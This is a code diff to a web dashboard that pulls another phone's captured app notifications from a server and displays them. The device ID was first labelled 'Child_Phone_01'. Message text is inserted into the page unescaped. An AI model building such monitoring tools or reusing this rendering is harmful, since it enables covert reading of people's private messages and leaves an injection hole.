@@ -83,7 +83,7 @@
 
         @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
         .modal-app-name { font-weight: bold; font-size: 1.1rem; }
-        .modal-body { font-size: 1rem; line-height: 1.6; color: #e0e0e0; margin-top: 15px; }
+        .modal-body { font-size: 1rem; line-height: 1.6; color: #e0e0e0; margin-top: 15px; word-wrap: break-word; }
         .close-modal { position: absolute; top: 15px; right: 20px; font-size: 1.5rem; color: #aaa; cursor: pointer; }
         .empty-state { text-align: center; padding: 50px; color: var(--text-muted); }
     </style>
@@ -117,32 +117,49 @@
     </div>
 
     <script>
+        // --- 🛑 SETTINGS 🛑 ---
+        // Yahan sahi ID daal di hai maine:
+        const DEVICE_ID = "M2103K19I"; 
+        
+        // Agar Render par hi site kholi hai to ye sahi hai.
+        // Agar GitHub Pages use kar rahe ho, to yahan Render ka link daalna padega.
+        // Abhi ke liye auto-detect rakha hai:
         const RENDER_URL = window.location.origin;
-        const DEVICE_ID = "Child_Phone_01";
 
         document.addEventListener("DOMContentLoaded", fetchNotifications);
 
         async function fetchNotifications() {
             const listContainer = document.getElementById("notif-list");
             try {
-                // Fixed API path to match server.js
+                // Correct URL: /api/get-data/ID/notifications
                 const response = await fetch(`${RENDER_URL}/api/get-data/${DEVICE_ID}/notifications`);
-                const data = await response.json();
+                
+                // Agar 404 ya error aaye
+                if (!response.ok) throw new Error("File not found");
 
+                const data = await response.json();
                 listContainer.innerHTML = ""; 
 
                 if (!data || data.length === 0) {
                     listContainer.innerHTML = `
                         <div class="empty-state">
                             <i class="fa-solid fa-bell-slash" style="font-size: 3rem; margin-bottom: 10px;"></i>
-                            <p>No Notifications Yet on Server</p>
+                            <p>No Notifications Yet</p>
+                            <small>Wait for phone to send data</small>
                         </div>`;
                     return;
                 }
 
-                // New notifications on top
+                // Newest first
                 data.reverse().forEach(notif => {
                     const appInfo = getAppStyle(notif.package_name);
+                    
+                    // Time formatting (Agar timestamp hai to convert karo)
+                    let timeStr = notif.time || "";
+                    if(notif.postTime && !isNaN(notif.postTime)) {
+                        timeStr = new Date(parseInt(notif.postTime)).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
+                    }
+
                     const card = document.createElement("div");
                     card.className = "notif-card";
                     card.onclick = () => openModal(appInfo, notif.title, notif.message);
@@ -153,14 +170,21 @@
                         </div>
                         <div class="content">
                             <div class="sender-name">${notif.title || "System"}</div>
-                            <div class="preview-text">${notif.message}</div>
+                            <div class="preview-text">${notif.message || "No content"}</div>
                         </div>
-                        <div class="time-badge">${notif.time || ""}</div>
+                        <div class="time-badge">${timeStr}</div>
                     `;
                     listContainer.appendChild(card);
                 });
             } catch (err) {
-                listContainer.innerHTML = `<div class="empty-state" style="color:#ff4444;">Failed to sync.</div>`;
+                console.error(err);
+                // Agar data file nahi bani abhi tak
+                listContainer.innerHTML = `
+                    <div class="empty-state" style="color:#aaaaaa;">
+                        <i class="fa-solid fa-hourglass-half" style="font-size: 2rem; margin-bottom:10px;"></i>
+                        <p>Waiting for data...</p>
+                        <small>Make sure notifications are enabled on phone</small>
+                    </div>`;
             }
         }
 
@@ -172,15 +196,16 @@
             if (p.includes("facebook")) return { icon: 'fa-brands fa-facebook', color: '#1877F2', name: 'Facebook' };
             if (p.includes("snapchat")) return { icon: 'fa-brands fa-snapchat', color: '#FFFC00', name: 'Snapchat' };
             if (p.includes("youtube")) return { icon: 'fa-brands fa-youtube', color: '#FF0000', name: 'YouTube' };
+            if (p.includes("telegram")) return { icon: 'fa-brands fa-telegram', color: '#229ED9', name: 'Telegram' };
             return { icon: 'fa-solid fa-cube', color: '#aaaaaa', name: 'App' };
         }
 
         function openModal(appInfo, sender, message) {
             document.getElementById("modalIcon").innerHTML = `<i class="${appInfo.icon}"></i>`;
             document.getElementById("modalIcon").style.color = appInfo.color;
-            document.getElementById("modalAppName").innerText = appInfo.name + " - " + sender;
+            document.getElementById("modalAppName").innerText = appInfo.name + (sender ? ` - ${sender}` : "");
             document.getElementById("modalAppName").style.color = appInfo.color;
-            document.getElementById("modalMessage").innerText = message;
+            document.getElementById("modalMessage").innerText = message || "No content";
             document.getElementById("detailModal").style.display = "flex";
         }
 
